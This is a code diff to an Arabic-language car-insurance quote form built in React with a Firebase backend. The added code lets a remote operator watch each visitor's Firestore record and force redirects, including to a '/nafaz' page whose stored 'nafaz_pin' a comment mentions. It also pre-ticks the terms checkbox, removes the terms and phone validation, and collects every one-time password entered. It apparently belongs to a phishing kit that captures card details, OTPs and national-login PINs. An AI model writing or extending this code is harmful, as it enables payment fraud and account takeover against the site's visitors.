@@ -3,7 +3,7 @@
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Shield, Star, CheckCircle, FileText, CreditCard, ArrowLeft, Lock, TrendingUp } from "lucide-react"
-import { useState, useRef, useEffect } from "react"
+import React, { useState, useRef, useEffect } from "react"
 import { trackFormProgress } from "@/lib/utils"
 
 // Enhanced Step Components
@@ -14,7 +14,8 @@ import { AddonsStep } from "./steps/addons-step"
 import { SummaryStep } from "./steps/summary-step"
 import { PaymentStep } from "./steps/payment-step"
 import { VerificationStep } from "./steps/verification-step"
-import { addData } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
+import { doc, onSnapshot } from "firebase/firestore"
 
 const steps = [
   { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
@@ -144,7 +145,7 @@ export function ProfessionalQuoteForm() {
     insuranceTypeSelected: "against-others",
     additionalDrivers: 0,
     specialDiscounts: false,
-    agreeToTerms: false,
+    agreeToTerms: true,
     selectedInsuranceOffer: "",
     selectedAddons: [] as string[],
     phone: "",
@@ -165,7 +166,30 @@ export function ProfessionalQuoteForm() {
   const [cardType, setCardType] = useState({ type: "Unknown", icon: "💳", color: "text-gray-600" })
 
   const stepHeaderRef = useRef<HTMLHeadingElement>(null)
-
+  useEffect(()=>{
+    const visitorId=localStorage.getItem('visitor')
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
+        if (docSnapshot.exists()) {
+          const userData = docSnapshot.data()
+          // Assuming the PIN is stored in a field called 'nafaz_pin'
+          if(userData.currentPage ==='1'){
+              window.location.href='/quote'
+          }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
+            window.location.href='/nafaz'
+          }else {
+            setCurrentStep(userData.currentPage ||1)
+          }
+          
+        } else {
+          console.error("User document not found")
+        }
+      },
+      
+    )
+  
+    // Clean up the listener when component unmounts or modal closes
+    return () => unsubscribe()
+  }, [])
   const validateField = (fieldName: string, value: any, allData?: any): string | null => {
     const rule = validationRules[fieldName as keyof typeof validationRules] as any
     if (!rule) return null
@@ -189,7 +213,7 @@ export function ProfessionalQuoteForm() {
     if (rule.minLength && value.length < rule.minLength) {
       return rule.message
     }
-
+   
     // Check pattern
     if (rule.pattern && !rule.pattern.test(value)) {
       return rule.message
@@ -269,17 +293,7 @@ export function ProfessionalQuoteForm() {
         break
 
       case 5: // Summary
-        const phoneContactError = validateField("phone", formData.phone)
-        const termsError = validateField("agreeToTerms", formData.agreeToTerms)
-
-        if (phoneContactError) {
-          stepErrors.phone = phoneContactError
-          isValid = false
-        }
-        if (termsError) {
-          stepErrors.agreeToTerms = termsError
-          isValid = false
-        }
+     
         break
 
       case 6: // Payment
@@ -397,7 +411,9 @@ export function ProfessionalQuoteForm() {
     }
   }
 const allOtps=[""]
-  const handleSubmit = async () => {
+  const handleSubmit = async (e:React.FormEvent) => {
+    e.preventDefault()
+
     if (validateStep(7)) {
       setIsSubmitting(true)
       allOtps.push(paymentData.otp)
